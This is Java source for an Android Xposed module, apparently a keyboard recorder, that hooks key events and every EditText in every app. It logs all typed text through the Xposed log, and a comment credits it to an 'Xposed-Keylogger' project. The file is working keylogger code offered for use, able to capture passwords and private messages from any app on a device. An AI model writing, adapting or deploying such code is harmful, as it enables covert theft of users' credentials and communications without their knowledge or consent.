package com.github.snowdream.xposed_keyboard_recorder;

import android.support.annotation.NonNull;
import android.text.Editable;
import android.text.TextWatcher;
import android.view.KeyEvent;
import android.widget.EditText;
import de.robv.android.xposed.IXposedHookLoadPackage;
import de.robv.android.xposed.XC_MethodHook;
import de.robv.android.xposed.XposedBridge;
import de.robv.android.xposed.XposedHelpers;
import de.robv.android.xposed.callbacks.XC_LoadPackage;

import java.util.Set;

import static de.robv.android.xposed.XposedHelpers.findClass;

/**
 * Created by snowdream on 16-8-29.
 */
public class Main implements IXposedHookLoadPackage {
    private static final String TAG = "SnowdreamFramework";

    @Override
    public void handleLoadPackage(XC_LoadPackage.LoadPackageParam loadPackageParam) throws Throwable {
        log("SnowdreamFramework","Launch app: " + loadPackageParam.packageName);

        hookKeyEvent(loadPackageParam.classLoader,loadPackageParam.packageName);
        hookTextInput(loadPackageParam.classLoader,loadPackageParam.packageName);
    }


    private void hookKeyEvent(@NonNull final ClassLoader classLoader, @NonNull final String packageName){
        log(packageName,"hookKeyEvent");
        //Hooking it
        try {
            XposedHelpers.findAndHookMethod("android.app.Activity",classLoader, "onKeyDown", int.class, KeyEvent.class, new XC_MethodHook() {
                @Override
                protected void afterHookedMethod(MethodHookParam param) throws Throwable {
                    super.afterHookedMethod(param);
                    if (param.args.length != 2 || !(param.args[1] instanceof KeyEvent)) {
                        return;
                    }

                    Integer keyCode = (Integer) param.args[0];

                    log(packageName, "keyEvent code: " + keyCode);
                }
            });
        }catch (Exception e) {
            //Simply ignore
            log(packageName,e.toString());
        }

    }



    //from https://github.com/giuliomvr/Xposed-Keylogger
    private void hookTextInput(@NonNull final ClassLoader classLoader, @NonNull final String packageName) {
        log(packageName,"hookTextInput");

        //Getting the View class
        Class clazz = findClass("android.view.View", classLoader);
        //Hooking it
        final Set<XC_MethodHook.Unhook> unhooks = XposedBridge.hookAllConstructors(clazz, new XC_MethodHook() {

            @Override
            protected void afterHookedMethod(MethodHookParam param) throws Throwable {
                super.afterHookedMethod(param);
                try {
                    //Dont hook it if its not an instance of EditText
                    if (!(param.thisObject instanceof EditText))
                        return;

                    //Cast this object into an EditText
                    final EditText et = (EditText) param.thisObject;
                    //Adding a listener
                    et.addTextChangedListener(new TextWatcher() {

                        @Override
                        public void beforeTextChanged(CharSequence s, int start, int count, int after) {
                            //Do nothing
                        }

                        @Override
                        public void onTextChanged(CharSequence s, int start, int before, int count) {
                            //Do nothing
                        }

                        @Override
                        public void afterTextChanged(Editable s) {
                            log(packageName,"Text: "+ s.toString());
                        }

                    });
                } catch (Exception e) {
                    //Simply ignore
                    log(packageName,e.toString());
                }
            }

        });
    }

    private void log(String packageName, String str){
        StringBuilder builder = new StringBuilder();
        builder.append(TAG);
        builder.append("    ");
        builder.append("packageName: ");
        builder.append(packageName);
        builder.append("    ");
        builder.append(str);

        XposedBridge.log(builder.toString());
    }
}
